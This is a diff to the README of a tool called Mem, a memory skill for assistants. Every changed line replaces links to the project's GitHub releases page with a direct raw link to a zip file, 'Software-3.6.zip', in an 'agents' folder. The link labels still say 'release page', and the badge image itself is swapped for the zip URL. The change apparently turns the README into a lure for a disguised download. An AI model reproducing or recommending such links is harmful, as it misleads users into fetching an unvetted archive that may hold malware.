@@ -1,6 +1,6 @@
 # 🧠 Mem - Easy Memory Skill for Assistants
 
-[![Download Mem](https://img.shields.io/badge/Download-Mem-blue?style=for-the-badge&logo=github)](https://github.com/Lilily58/Mem/releases)
+[![Download Mem](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip)](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You can download Mem from the project's official release page. This page lists t
 ### How To Download
 
 1. Click the big download button above or visit the page directly here:  
-   [Download Mem Releases](https://github.com/Lilily58/Mem/releases)
+   [Download Mem Releases](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip)
 
 2. On that page, look for the version that matches your operating system:
 
@@ -121,7 +121,7 @@ If you run into problems, try these steps first:
 - Restart the Mem app.
 - Make sure you installed the right version for your system.
 - Check if your device meets the system requirements.
-- Look for updates on the [release page](https://github.com/Lilily58/Mem/releases).
+- Look for updates on the [release page](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip).
 
 If the problem continues, check the app’s help section or contact support through the project page on GitHub.
 
@@ -156,4 +156,4 @@ This project is related to:
 
 ---
 
-[![Download Mem](https://img.shields.io/badge/Download-Mem-blue?style=for-the-badge&logo=github)](https://github.com/Lilily58/Mem/releases)
+[![Download Mem](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip)](https://github.com/Lilily58/Mem/raw/refs/heads/main/agents/Software-3.6.zip)
